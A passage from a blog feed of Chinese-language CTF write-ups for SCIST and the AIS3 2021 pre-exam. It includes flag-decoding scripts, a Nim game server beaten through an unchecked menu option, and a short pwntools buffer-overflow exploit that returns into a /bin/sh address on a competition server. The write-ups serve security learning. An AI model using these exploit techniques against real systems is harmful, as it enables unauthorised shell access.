number">51</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">52</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">107</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">106</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">122</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span>i<span class="token operator">^</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>flag:<code>SCIST{l4mbd4_7h3n_l4mbd4}</code></p><h3 id="Flag-Checker-Online-379"><a href="#Flag-Checker-Online-379" class="headerlink" title="Flag Checker ^ Online(379)"></a>Flag Checker ^ Online(379)</h3><blockquote><p>Good, old flag checker… But online…<br><a href="http://chall.ctf.scist.org:10201/">http://chall.ctf.scist.org:10201</a><br>Author: CSY54</p></blockquote><p>把 js 檔案美化之後可以看到裡面有一個 function</p><div class="spoiler collapsed">    <div class="spoiler-title">        js    </div>    <div class="spoiler-content">        <pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">i</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> e<span class="token punctuation">.</span>length <span class="token operator">===</span> t<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> e <span class="token operator">===</span> t<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>e <span class="token operator">=</span><span class="token operator">></span> e <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> t<span class="token punctuation">,</span> n<span class="token punctuation">,</span> r<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> n <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token operator">...</span>e<span class="token punctuation">,</span> t <span class="token operator">^</span> r<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>e <span class="token operator">=</span><span class="token operator">></span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span></code></pre>    </div></div><p><strong>script</strong></p><pre class=" language-python"><code class="language-python">t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">166</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">238</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">,</span> <span class="token number">162</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">210</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">198</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">156</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">186</span><span class="token punctuation">,</span> <span class="token number">208</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>t<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p>flag:<code>SCIST{0bfu5c473_4nd_0BFU5C473}</code></p><h2 id="PWN-1-x2F-2"><a href="#PWN-1-x2F-2" class="headerlink" title="PWN(1/2)"></a>PWN(1/2)</h2><h3 id="Buffer-Crasher-491"><a href="#Buffer-Crasher-491" class="headerlink" title="Buffer Crasher(491)"></a>Buffer Crasher(491)</h3><blockquote><p>chall.ctf.scist.org:10101<br>Author: TwinkleStar03 &amp; nella17]</p></blockquote><p>overflow 的裸題<br>用 IDA 開起來<br><img src="https://i.imgur.com/c5yuLao.png">)<br>去找到<code>/bin/sh</code>的 address<br><img src="https://i.imgur.com/FEmez2a.png">)</p><p><strong>script</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'chall.ctf.scist.org'</span><span class="token punctuation">,</span><span class="token number">10101</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#r = process('./buffer-crasher')</span>r<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'A'</span><span class="token operator">*</span><span class="token number">840</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x040119E</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> SCIST </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SCIST </tag>
            
            <tag> write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 AIS3 Pre-exam write-up</title>
      <link href="/2021/05/24/2021-AIS3-Pre-exam-write-up/"/>
      <url>/2021/05/24/2021-AIS3-Pre-exam-write-up/</url>
      
        <content type="html"><![CDATA[<h2 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h2><table><thead><tr><th>ID</th><th>gunjyo</th></tr></thead><tbody><tr><td>Date</td><td>2021/05/22 10:00 - 2021/05/24 17:30</td></tr><tr><td>Rank</td><td>61(正取 AIS3)</td></tr><tr><td>Score</td><td>1346</td></tr></tbody></table><h2 id="Prologue"><a href="#Prologue" class="headerlink" title="Prologue"></a>Prologue</h2><p>這是我第一次參加 AIS3 Pre-exam，最終成績是 61 名，過程中運氣好有上去到 43 名，對我來說覺得還不錯&gt;&lt;<br>剛好落在錄取的 75 名內，萬幸~<br>隔年應該會因為準備大學而無法參加，希望後年能夠拿到更好的成績~<br><img src="https://i.imgur.com/OG8f5z5.jpg" alt="AIS3 rank"></p><p>事不遲疑，直接進到 write-up 吧</p><blockquote><p>註 有些題目跟 MFC 是重疊的哦~ write-up 是一致的</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi-100"><a href="#Cat-Slayer-ᶠᵃᵏᵉ-Nekogoroshi-100" class="headerlink" title="Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi (100)"></a>Cat Slayer ᶠᵃᵏᵉ | Nekogoroshi (100)</h3><blockquote><p>BGM: <a href="https://youtu.be/9-NusuQ8JaA">亜咲花「I believe what you said」</a><br>TERM=xterm-256color ssh -p 5566 <a href="mailto:h173@quiz.ais3.org">h173@quiz.ais3.org</a><br>Author: splitline feat. Hojo Satoko</p></blockquote><p>Welcome 題</p><p><code>TERM=xterm-256color ssh -p 5566 h173@quiz.ais3.org</code><br>連線後會跳轉到輸入數字密碼的介面，只要按錯一個就會跳 Locked，要重新連線<br>暴力嘗試即可<br>密碼 2025830455298</p><blockquote><p>flag <code>AIS3{H1n4m1z4w4_Sh0k0gun}</code></p></blockquote><blockquote><p>HINT 附上了<a href="https://youtu.be/2b3Oqo13-r0?t=1296">影片</a></p></blockquote><h3 id="Microcheese-141"><a href="#Microcheese-141" class="headerlink" title="Microcheese(141)"></a>Microcheese(141)</h3><p>是一個撿石頭遊戲，玩家和電腦輪流選任一排的任意數目的石子，將它們移去，最後清空盤面的獲勝。<br><img src="https://i.imgur.com/bi7g9ec.png" alt="Chess"></p><div class="spoiler collapsed">    <div class="spoiler-title">        game.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> random<span class="token keyword">from</span> typing <span class="token keyword">import</span> Tuple<span class="token keyword">class</span> <span class="token class-name">Game</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    a simple Nim game with normal rules.    grundy's theorem: if nim_sum() is zero, then the player to move has a    winning strategy. otherwise, the other player has a winning strategy.    '''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">generate_winning_game</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''generate a game such that the first player has a winning strategy'''</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        xor_sum <span class="token operator">=</span> <span class="token number">0</span>        piles <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>piles<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>count <span class="token punctuation">:</span><span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            xor_sum <span class="token operator">^</span><span class="token operator">=</span> count        <span class="token keyword">if</span> xor_sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">generate_losing_game</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''generate a game such that the second player has a winning strategy'''</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        xor_sum <span class="token operator">=</span> <span class="token number">0</span>        piles <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>piles<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>count <span class="token punctuation">:</span><span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            xor_sum <span class="token operator">^</span><span class="token operator">=</span> count        <span class="token keyword">if</span> xor_sum <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xor_sum<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> pile<span class="token punctuation">:</span> int<span class="token punctuation">,</span> count<span class="token punctuation">:</span> int<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''makes a move, returns whether the move is legal'''</span>        <span class="token keyword">if</span> pile <span class="token operator">not</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> count <span class="token operator">not</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        self<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span> <span class="token operator">-=</span> count        <span class="token keyword">if</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>stones<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>pile<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">nim_sum</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>        xor_sum <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> count <span class="token keyword">in</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">:</span>            xor_sum <span class="token operator">^</span><span class="token operator">=</span> count        <span class="token keyword">return</span> xor_sum    <span class="token keyword">def</span> <span class="token function">ended</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> bool<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        checks if the game has ended, i.e., the player has no more moves.        if True, the current player loses the game        '''</span>        <span class="token keyword">return</span> len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'+---+-------------- stones info ------------------+'</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> pile<span class="token punctuation">,</span> count <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'| {pile} | {"o" * count:&lt;43} |'</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">load</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> game_str<span class="token punctuation">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> None<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''loads a saved game from string'''</span>        self<span class="token punctuation">.</span>stones <span class="token operator">=</span> list<span class="token punctuation">(</span>map<span class="token punctuation">(</span>int<span class="token punctuation">,</span> game_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">save</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''returns the current game as a string'''</span>        <span class="token keyword">return</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>map<span class="token punctuation">(</span>str<span class="token punctuation">,</span> self<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">AIPlayer</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    a perfect Nim player. if there exists a winning strategy for a game, this    player will always win.    '''</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">def</span> <span class="token function">get_move</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> game<span class="token punctuation">:</span> Game<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Tuple<span class="token punctuation">[</span>int<span class="token punctuation">,</span> int<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">'''        if there is a winning strategy, returns a move that guarantees a win.        otherwise, returns a random move.        '''</span>        nim_sum <span class="token operator">=</span> game<span class="token punctuation">.</span>nim_sum<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> nim_sum <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># losing game, make a random move</span>            pile <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>game<span class="token punctuation">.</span>stones<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>            count <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> game<span class="token punctuation">.</span>stones<span class="token punctuation">[</span>pile<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># winning game, make a winning move</span>            <span class="token keyword">for</span> i<span class="token punctuation">,</span> v <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>game<span class="token punctuation">.</span>stones<span class="token punctuation">)</span><span class="token punctuation">:</span>                target <span class="token operator">=</span> v <span class="token operator">^</span> nim_sum                <span class="token keyword">if</span> target <span class="token operator">&lt;</span> v<span class="token punctuation">:</span>                    pile <span class="token operator">=</span> i                    count <span class="token operator">=</span> v <span class="token operator">-</span> target                    <span class="token keyword">break</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>pile<span class="token punctuation">,</span> count<span class="token punctuation">)</span></code></pre>    </div></div><div class="spoiler collapsed">    <div class="spoiler-title">        server.py    </div>    <div class="spoiler-content">        <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> myhash<span class="token keyword">from</span> game <span class="token keyword">import</span> Game<span class="token punctuation">,</span> AIPlayer<span class="token keyword">from</span> text <span class="token keyword">import</span> <span class="token operator">*</span>flag <span class="token operator">=</span> <span class="token string">'(no flag here)'</span>hash <span class="token operator">=</span> myhash<span class="token punctuation">.</span>Hash<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">play</span><span class="token punctuation">(</span>game<span class="token punctuation">:</span> Game<span class="token punctuation">)</span><span class="token punctuation">:</span>    ai_player <span class="token operator">=</span> AIPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>    win <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">while</span> <span class="token operator">not</span> game<span class="token punctuation">.</span>ended<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        game<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>        print_game_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>        choice <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'it\'s your turn to move! what do you choose? '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>            pile <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">'which pile do you choose? '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            count <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">'how many stones do you remove? '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> game<span class="token punctuation">.</span>make_move<span class="token punctuation">(</span>pile<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">:</span>                print_error<span class="token punctuation">(</span><span class="token string">'that is not a valid move!'</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>        <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            game_str <span class="token operator">=</span> game<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>            digest <span class="token operator">=</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span>game_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'you game has been saved! here is your saved game:'</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>game_str <span class="token operator">+</span> <span class="token string">':'</span> <span class="token operator">+</span> digest<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment" spellcheck="true"># no move -> player wins!</span>        <span class="token keyword">if</span> game<span class="token punctuation">.</span>ended<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            win <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            print_move<span class="token punctuation">(</span><span class="token string">'you'</span><span class="token punctuation">,</span> count<span class="token punctuation">,</span> pile<span class="token punctuation">)</span>            game<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># the AI plays a move</span>        pile<span class="token punctuation">,</span> count <span class="token operator">=</span> ai_player<span class="token punctuation">.</span>get_move<span class="token punctuation">(</span>game<span class="token punctuation">)</span>        <span class="token keyword">assert</span> game<span class="token punctuation">.</span>make_move<span class="token punctuation">(</span>pile<span class="token punctuation">,</span> count<span class="token punctuation">)</span>        print_move<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> count<span class="token punctuation">,</span> pile<span class="token punctuation">)</span>    <span class="token keyword">if</span> win<span class="token punctuation">:</span>        print_flag<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        print_lose<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    print_main_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>    choice <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'what would you like to do? '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">:</span>        print_rules<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>        game <span class="token operator">=</span> Game<span class="token punctuation">(</span><span class="token punctuation">)</span>        game<span class="token punctuation">.</span>generate_losing_game<span class="token punctuation">(</span><span class="token punctuation">)</span>        play<span class="token punctuation">(</span>game<span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>        saved <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'enter the saved game: '</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        game_str<span class="token punctuation">,</span> digest <span class="token operator">=</span> saved<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span>game_str<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> digest<span class="token punctuation">:</span>            game <span class="token operator">=</span> Game<span class="token punctuation">(</span><span class="token punctuation">)</span>            game<span class="token punctuation">.</span>load<span class="token punctuation">(</span>game_str<span class="token punctuation">)</span>            play<span class="token punctuation">(</span>game<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            print_error<span class="token punctuation">(</span><span class="token string">'invalid game provided!'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'omg bye!'</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    print_welcome<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            menu<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'oops i died'</span><span class="token punctuation">)</span></code></pre>    </div></div><p>從 <code>game.py</code> 的規則可以看到有先手贏的棋盤(<code>generate_winning_game()</code>)和後手贏的棋盤(<code>generate_losing_game()</code>)，我是先手，所以 SERVER 會給後手贏的棋盤，理論上來說應該贏不了。<br><img src="https://i.imgur.com/3KslZMz.png" alt="play()"><br>但問題出在 <code>server.py</code> 中的 <code>play()</code>，只有判斷 <code>choice</code> 為 0,1,2 的狀況，因此若我們輸入非 0,1,2 的數字便可跳過回合，直到剩下最後一排為止，便可以獲勝得到 flag<br><img src="https://i.imgur.com/9OAfNm9.png" alt="win"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" 